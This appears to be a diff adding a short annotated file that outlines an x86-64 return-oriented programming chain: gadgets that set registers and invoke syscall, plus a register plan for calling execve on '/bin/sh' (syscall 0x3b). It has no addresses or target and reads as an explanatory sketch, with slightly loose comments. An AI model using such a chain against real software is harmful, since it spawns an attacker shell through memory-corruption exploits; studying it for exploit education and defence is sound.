@@ -1,0 +1,16 @@
+pop %rax; ret               # load rax with next value on stack (system call number)
+xor %rsi, %rsi; ret         # clear rsi (second argument)
+xor %rdx, %rdx; ret         # clear rdx (third argument)
+mov %rsp, %rdi              # load rdi with pointer to the command to execute (first argument)
+add $0x8, %rsp              # skip the old rax value and align the stack
+ret                         # return to the next instruction
+
+syscall; ret                # trigger the system call
+
+
+
+rax = 0x3b  # system call number for execve
+rdi = pointer to "/bin/sh"  # command to execute
+rsi = pointer to NULL  # arguments for the command
+rdx = pointer to NULL  # environment variables
+
